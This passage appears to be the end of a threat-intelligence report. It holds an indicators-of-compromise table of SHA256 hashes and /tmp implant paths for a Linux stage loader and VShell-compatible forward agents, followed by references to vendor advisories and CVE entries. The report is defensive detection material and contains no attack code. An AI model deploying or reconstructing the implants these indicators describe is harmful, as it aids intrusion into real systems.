| `d79f80b7b2b437f8d8de2e6df54d637080230377c0a07dee384112fe5ef4a81f` | SHA256 | Linux TCP stage loader that retrieves and memory-executes an XOR-decoded payload from the configured staging endpoint. |
| `576eed7cf2a6e8f900cc869b8b05620afb7609ed479412e32b139c8299847ada` | SHA256 | VShell-compatible Linux forward-agent variant present in the exposed MFA collection. |
| `6dceaa79c34ee2d6ea1734d77e1f1155292e9588f35427a6dcb18f7c0120187e` | SHA256 | VShell-compatible Linux forward agent whose hash was observed on the recorded MFA host with process evidence. |
| `d0ec32e389f3ea70d70cad67061ed6fa125641925821ec0546ebc463709d8f39` | SHA256 | VShell-compatible Linux forward agent whose hash was observed at `/tmp/.mfa-vshell-forward-8085` with process and listening-socket evidence. |
| `/tmp/.mfa-vshell-forward-8085` | File path | Confirmed implant path in the supplied Kyrgyz MFA execution records. |
| `/tmp/.mfa-vshell-forward-8086` | File path | Confirmed implant path for the second VShell-compatible MFA forward agent. |

## References

- [Hunt.io](https://hunt.io/)
- [Ctrl-Alt-Intel: Burnt by Burgers, Highlighting Void Blizzard's Russian State Links](https://ctrlaltintel.com/research/VoidBlizzard/)
- [Uralchem: About the company](https://www.uralchem.com/about/index.php)
- [Bui Chemical Plant](https://bhz.ru/)
- [Directorate of the State Customer for Maritime Transport Development Programs](https://dgz.ru/index.html)
- [United Engine Corporation](https://uecrus.com/)
- [Russian Institute for Strategic Studies: Goals and objectives](https://www.riss.ru/en/ob-institute/tseli-i-zadachi/)
- [Microsoft security update addressing CVE-2023-29357 in SharePoint Server 2019](https://support.microsoft.com/en-au/topic/description-of-the-security-update-for-sharepoint-server-2019-june-13-2023-kb5002402-c5d58925-f7be-4d16-a61b-8ce871bbe34d)
- [Microsoft security update addressing CVE-2023-24955 in SharePoint Server Subscription Edition](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-sharepoint-server-subscription-edition-may-9-2023-kb5002390-5d150cf3-e42d-4a0e-b015-0b4357b8e5ea)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Roundcube security updates 1.6.11 and 1.5.10](https://roundcube.net/news/2025/06/01/security-updates-1.6.11-and-1.5.10)
- [Palo Alto Networks advisory for CVE-2024-3400](https://security.paloaltonetworks.com/CVE-2024-3400)
- [NVD entry for CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)
- [ShareFile Storage Zones Controller security advisory](https://docs.sharefile.com/en-us/sharefile/storage-zones-controller/5-0/security-vulnerability-feb26)
- [Sysdig research on VShell](https://sysdig.com/blog/unc5174-chinese-threat-actor-vshell/)
